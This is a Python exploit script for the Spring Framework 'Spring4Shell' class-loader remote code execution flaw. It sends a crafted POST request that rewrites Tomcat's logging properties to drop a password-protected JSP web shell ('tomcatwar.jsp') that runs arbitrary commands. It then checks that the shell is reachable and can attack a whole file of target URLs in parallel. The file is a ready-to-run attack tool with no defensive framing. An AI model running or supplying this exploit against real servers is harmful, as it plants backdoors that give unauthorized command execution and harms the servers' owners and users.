#! /usr/bin/env python3
#coding:utf-8

import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from urllib.parse import urljoin,urlparse
from threading import Thread
from sys import exit
import time


class Exploit(Thread):

    def __init__(self, url):
        super(self.__class__, self).__init__()

        self.url = url

    def run(self):
        headers = {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

        try:
            requests.post(self.url,
                          headers=headers,
                          data=data,
                          timeout=15,
                          allow_redirects=False,
                          verify=False)
            time.sleep(10) ## Wait for the upload to complete
            shellurl = urljoin(self.url, 'tomcatwar.jsp')
            shellgo = requests.get(shellurl,
                                   timeout=15,
                                   allow_redirects=False,
                                   stream=True,
                                   verify=False)
            if shellgo.status_code == 200:
                print(f"Vulnerable，shell url: {shellurl}?pwd=j&cmd=whoami")

            ## Depending on the server, the shell url may be in tomcats root folder
            else:
                parsedurl = urlparse(shellurl)
                rooturl = parsedurl.scheme+"://"+parsedurl.netloc # There is 100% a better way to do this, please make a PR if you know!
                shellurlroot = urljoin(rooturl, 'tomcatwar.jsp')
                shellgoroot = requests.get(shellurlroot,
                                   timeout=15,
                                   allow_redirects=False,
                                   stream=True,
                                   verify=False)
                if shellgoroot.status_code == 200: 
                    print(f"Vulnerable，shell url: {shellurlroot}?pwd=j&cmd=whoami")
                else:
                    print(f"\033[91m[" + '\u2718' + "]\033[0m", self.url,
                        "\033[91mNot Vulnerable! :(\033[0m ")

        except Exception as e:
            print(e)
            pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Spring-Core Rce.')
    parser.add_argument('--file', help='url file', required=False)
    parser.add_argument('--url', help='target url', required=False)
    args = parser.parse_args()

    if args.url:
        Exploit(args.url).start()
        exit()

    if args.file:
        with open(args.file) as f:
            urls = [i.strip() for i in f.readlines()]
            [Exploit(url).start() for url in urls]

    else:
        parser.print_help()
